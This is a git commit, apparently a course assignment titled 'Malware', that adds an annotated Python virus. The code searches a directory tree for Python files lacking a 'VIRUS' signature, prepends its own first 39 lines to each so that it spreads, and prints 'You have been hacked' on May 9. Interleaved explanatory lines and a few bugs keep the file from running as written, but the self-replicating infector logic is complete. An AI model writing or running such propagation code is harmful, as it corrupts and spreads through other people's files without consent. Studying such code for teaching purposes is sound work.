255e07d6b349cba718540bc785da2b58bad9a776
christen-reinhart <christen.reinhart@yahoo.com>
2023-12-14 21:27:19 -0500

    Malware

---
+++ 301Challenge14.py
@@ -0,0 +1,81 @@
+#!/usr/bin/python3
+
+-Shebang line specifies an interpreter is to be used in python3.
+
+import os
+import datetime
+
+-Both of these lines import the necessary modules for the “os” and “date/time”
+
+SIGNATURE = "VIRUS"
+
+-This defines a variable SIGNATURE  with the vale VIRUS
+
+def locate(path):
+    files_targeted = []   # Initialize a empty list of files to be targeted
+    filelist = os.listdir(path)   # Get a list of files in current directory
+    for fname in filelist:
+        if os.path.isdir(path+"/"+fname):
+            files_targeted.extend(locate(path+"/"+fname))   # Recursive call for subdirectories
+        elif fname[-3:] == ".py":
+            infected = False
+            for line in open(path+"/"+fname):
+                if SIGNATURE in line:
+                    infected = True
+                    break
+            if infected == False:
+# Check if file is infected 
+
+                files_targeted.append(path+"/"+fname)  # Add uninfected files to the list
+    return files_targeted
+
+-This function scans for virus-free Python files in a directory and its subfolders, adding clean files to a list.
+
+
+
+def infect(files_targeted):
+# This function infects files by prepending the code
+
+    virus = open(os.path.abspath(__file__))
+    virusstring = ""
+    for i,line in enumerate(virus):
+        if 0 <= i < 39:
+            virusstring += line
+    Virus.close
+# Read the first 39 lines of the code and store it
+
+    for fname in files_targeted:
+        f = open(fname)
+        temp = f.read()
+        f.close()
+        f = open(fname,"w")
+        f.write(virusstring + temp)
+        f.close()
+# Prepend the code to trigger each file
+
+-This function acts as a virus propagation tool. It reads the first 39 lines of the current script as the virus payload, then loops through a list of victim files, injecting the payload at the beginning of each file, effectively compromising their functionality.
+
+
+def detonate():
+# This function contains a payload that triggers on the date
+   
+ if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
+        print("You have been hacked")
+# If it is May 9th print the associated message
+
+-This function verifies whether a certain date (May 9th) has arrived. If it has, it delivers a pre-determined message ("You have been hacked").
+
+
+files_targeted = locate(os.path.abspath(""))
+# Locate Python files in directory and subdirectory
+infect(files_targeted)
+# Infect the located files
+
+detonate()
+# Checks if the payload should be triggered and prints a message if the condition is met.
+
+-This script automates a series of actions: identifying Python files, modifying their content, and triggering a specific function based on a predefined condition.
+
+[Chat GPT](https://chat.openai.com/share/6a6344a7-a548-4025-91e5-17a767099cb8) 
+
+[Google Bard](https://bard.google.com/chat/a7d3263c176129cd) 
